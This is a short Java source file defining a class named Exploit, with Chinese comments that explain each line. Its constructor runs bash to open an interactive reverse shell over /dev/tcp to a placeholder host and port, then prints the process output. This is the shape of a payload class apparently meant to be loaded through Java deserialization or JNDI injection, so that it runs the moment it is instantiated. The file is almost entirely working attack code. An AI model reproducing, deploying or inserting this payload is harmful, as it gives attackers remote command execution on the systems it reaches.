import java.io.BufferedReader;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.Runtime;
import java.lang.Process;

public class Exploit{
    public Exploit() throws Exception {
        //创建一个进程的实例
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","bash -i >& /dev/tcp/ip/1234 0>&1"});
        InputStream is = p.getInputStream();//输入流
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));//输入流缓冲区

        String line;
        while((line = reader.readLine()) != null) {//循环读取缓冲区中的数据
            System.out.println(line);//输出获取 的数据
        }

        p.waitFor();//waitFor：返回该Process对象代表的进程的出口值，值0表示正常退出，非0非正常。
        is.close(); 
        reader.close();
        p.destroy();//destroy：杀掉该Process对象代表的进程。
    }

    public static void main(String[] args) throws Exception {
    }
}